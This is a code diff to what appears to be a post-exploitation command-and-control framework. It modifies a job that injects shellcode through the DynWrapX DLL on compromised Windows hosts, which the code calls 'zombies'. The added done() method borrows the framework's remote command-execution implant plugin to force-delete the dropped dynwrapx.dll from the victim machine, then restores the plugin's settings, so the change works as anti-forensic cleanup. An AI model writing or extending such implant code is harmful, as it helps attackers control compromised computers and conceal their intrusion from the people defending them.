@@ -3,6 +3,7 @@ import core.job
 import core.cred_parser
 import string
 import collections
+import time
 
 class DynWrapXShellcodeJob(core.job.Job):
     def create(self):
@@ -50,6 +51,19 @@ class DynWrapXShellcodeJob(core.job.Job):
 
     def done(self):
         self.display()
+        # deleting dynwrapx.dll, i hate this
+        time.sleep(1)
+        plugin = self.shell.plugins['implant/manage/exec_cmd']
+        old_zombie = plugin.options.get("ZOMBIE")
+        old_cmd = plugin.options.get("CMD")
+        old_output = plugin.options.get("OUTPUT")
+        plugin.options.set("ZOMBIE", self.options.get("ZOMBIE"))
+        plugin.options.set("CMD", "del /f "+self.options.get("DIRECTORY")+"\\dynwrapx.dll & echo done")
+        plugin.options.set("OUTPUT", "true")
+        plugin.run()
+        plugin.options.set("ZOMBIE", old_zombie)
+        plugin.options.set("CMD", old_cmd)
+        plugin.options.set("OUTPUT", old_output)
 
     def display(self):
         try:
